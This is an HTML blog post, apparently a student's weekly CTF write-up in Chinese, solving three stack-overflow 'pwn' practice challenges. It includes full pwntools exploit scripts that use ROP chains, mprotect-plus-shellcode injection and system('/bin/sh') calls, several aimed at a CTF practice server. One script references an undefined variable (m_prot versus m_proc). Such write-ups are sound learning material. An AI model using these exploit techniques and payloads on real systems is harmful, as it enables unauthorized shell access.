@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="题目get_started_3dsctf_2016checksec 打开了NX 在main函数中发现gets函数，存在栈溢出漏洞  同时，左侧函数表发现get_flag函数，当a1&#x3D;814536271，a2&#x3D;425138641时，读取flag.txt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第五周pwn">
+<meta property="og:url" content="http://example.com/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="题目get_started_3dsctf_2016checksec 打开了NX 在main函数中发现gets函数，存在栈溢出漏洞  同时，左侧函数表发现get_flag函数，当a1&#x3D;814536271，a2&#x3D;425138641时，读取flag.txt">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-15_11-02-13.png">
+<meta property="og:image" content="http://example.com/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-15_11-01-28.png">
+<meta property="og:image" content="http://example.com/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-15_11-05-24.png">
+<meta property="og:image" content="http://example.com/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-15_11-34-40.png">
+<meta property="og:image" content="http://example.com/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-15_11-41-16.png">
+<meta property="og:image" content="http://example.com/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-15_11-46-55.png">
+<meta property="og:image" content="http://example.com/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-19_11-22-35.png">
+<meta property="og:image" content="http://example.com/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-19_11-26-34.png">
+<meta property="article:published_time" content="2023-02-13T01:12:14.000Z">
+<meta property="article:modified_time" content="2023-02-19T03:32:41.687Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-15_11-02-13.png">
+
+<link rel="canonical" href="http://example.com/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>第五周pwn | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          第五周pwn
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-13 09:12:14" itemprop="dateCreated datePublished" datetime="2023-02-13T09:12:14+08:00">2023-02-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-02-19 11:32:41" itemprop="dateModified" datetime="2023-02-19T11:32:41+08:00">2023-02-19</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>checksec 打开了NX<img src="/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-15_11-02-13.png"></p>
+<p>在main函数中发现<code>gets</code>函数，存在栈溢出漏洞</p>
+<p><img src="/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-15_11-01-28.png"></p>
+<p>同时，左侧函数表发现<code>get_flag</code>函数，当a1&#x3D;814536271，a2&#x3D;425138641时，读取<strong>flag.txt</strong></p>
+<span id="more"></span>
+
+<p><img src="/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-15_11-05-24.png"></p>
+<p>一开始的exp是这样的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_flag = elf.symbols[<span class="string">&quot;get_flag&quot;</span>]</span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x38</span> + p32(get_flag) + p32(a1) + p32(a2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>但是，没有打通，后来发现，要用<code>exit</code>函数使程序正常退出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_flag = elf.symbols[<span class="string">&quot;get_flag&quot;</span>]</span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line">exit_addr = <span class="number">0x804E6A0</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x38</span> + p32(get_flag) +p32(exit_addr) + p32(a1) + p32(a2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这个exp可以</p>
+<p><img src="/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-15_11-34-40.png"></p>
+<p>但是看网上大佬的wp，还有另一种方法</p>
+<p>利用mprotect函数修改内存权限，然后用read读取shellcode，获取shell</p>
+<pre><code>int mprotect(void *addr, size_t len, int prot);
+addr 内存启始地址
+len  修改内存的长度
+prot 内存的权限
+</code></pre>
+<p>首先造成栈溢出，跳转到mprotect函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&quot;a&quot; * 0x38 +p32(mprotect_addr)</span><br></pre></td></tr></table></figure>
+
+<p>然后设置三个参数，为了继续控制程序，需要用到ret指令，所以借用指令片段</p>
+<p><img src="/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-15_11-41-16.png"></p>
+<p>选择080EB000为起始地址，</p>
+<p>因为这个指定的内存区间必须包含整个内存页(4K)，起始地址必须是一个内存页的起始地址，并且区间长度len是页大小的整数倍。4K &#x3D; 0x1000</p>
+<p>然后来借用三个寄存器</p>
+<p>我选择0x080483b8</p>
+<p><img src="/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-15_11-46-55.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload += p32(pop_ret)</span><br><span class="line">payload += p32(m_addr)</span><br><span class="line">payload += p32(m_len)</span><br><span class="line">payload += p32(m_prot)</span><br></pre></td></tr></table></figure>
+
+<p>然后是read函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssize_t read(int fd, void *buf, size_t count);</span><br><span class="line">fd 设为0时就可以从输入端读取内容    设为0</span><br><span class="line">buf 设为我们想要执行的内存地址      设为我们已找到的内存地址0x80EB000</span><br><span class="line">size 适当大小就可以               只要够读入shellcode就可以，设置大点无所谓</span><br></pre></td></tr></table></figure>
+
+<p>read也需要三个寄存器，依旧借用上述那个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload += p32(pop_ret)</span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(0)</span><br><span class="line">payload += p32(m_addr)</span><br><span class="line">payload += p32(0x111)</span><br><span class="line">payload += p32(m_addr)#将read函数的返回地址设置为修改的内存的地址，之后要往里写入shellcode</span><br></pre></td></tr></table></figure>
+
+<p>然后可以来构造shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload += asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
+
+<p>最后，完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line">r = process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_ret = <span class="number">0x080483b8</span></span><br><span class="line"></span><br><span class="line">m_addr = <span class="number">0x80EB000</span></span><br><span class="line">m_size = <span class="number">0x1000</span></span><br><span class="line">m_proc = <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">payload += p32(mprotect_addr)</span><br><span class="line">payload += p32(pop_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p32(m_addr)</span><br><span class="line">payload += p32(m_size)</span><br><span class="line">payload += p32(m_prot)</span><br><span class="line"></span><br><span class="line">payload += p32(read_addr)</span><br><span class="line"></span><br><span class="line">payload += p32(pop_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(m_addr)</span><br><span class="line">payload += p32(<span class="number">0x111</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(m_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h2><p>首先checksec<img src="/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-19_11-22-35.png">只打开了NX保护</p>
+<p>再反编译静态分析</p>
+<p><img src="/2023/02/13/%E7%AC%AC%E4%BA%94%E5%91%A8pwn/Snipaste_2023-02-19_11-26-34.png"></p>
+<p>有rea函数，足够溢出了，<code>system</code>和<code>/bin/sh</code>也都找到了，因为是64位程序，所以需要使用寄存器来进行，</p>
+<p>当参数少于7个时， 参数&lt;1-6&gt;放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p>
+<p>这里只有一个参数，那么来寻找<code>pop rdi;ret</code></p>
+<p>使用<code>ROPgadget --binary level2_x64 --only &quot;pop|ret&quot;</code>来寻找</p>
+<p>构造exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r = remote(&quot;node4.buuoj.cn&quot;,25268)</span><br><span class="line">#r = process(&quot;./level2_x64&quot;)</span><br><span class="line">elf = ELF(&quot;./level2_x64&quot;)</span><br><span class="line"></span><br><span class="line">sys_addr = 0x04004C0</span><br><span class="line">shell_addr = 0x0600A90</span><br><span class="line">pop_rdi = 0x04006b3</span><br><span class="line"></span><br><span class="line">payload = b&quot;a&quot;*0x88+p64(pop_rdi)+p64(shell_addr)+p64(sys_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><p>与上一题神似，都是最基础的64位栈溢出。</p>
+<p>直接贴exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r = remote(&quot;node4.buuoj.cn&quot;,27251)</span><br><span class="line">#r = process(&quot;./babyrop&quot;)</span><br><span class="line"></span><br><span class="line">sys_addr = 0x0400490</span><br><span class="line">shell_addr = 0x0601048</span><br><span class="line">pop_rdi = 0x0400683</span><br><span class="line"></span><br><span class="line">payload = b&quot;A&quot;*0x18+p64(pop_rdi)+p64(shell_addr)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>（好，周题完成）</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/02/12/%E7%AC%AC%E5%9B%9B%E5%91%A8pwn/" rel="prev" title="第四周pwn">
+      <i class="fa fa-chevron-left"></i> 第四周pwn
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/02/17/CentOS-%E5%AD%A6%E4%B9%A0/" rel="next" title="CentOS 学习">
+      CentOS 学习 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">1.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#get-started-3dsctf-2016"><span class="nav-number">1.1.</span> <span class="nav-text">get_started_3dsctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2-x64"><span class="nav-number">1.2.</span> <span class="nav-text">level2_x64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-baby-rop"><span class="nav-number">1.3.</span> <span class="nav-text">[HarekazeCTF2019]baby_rop</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
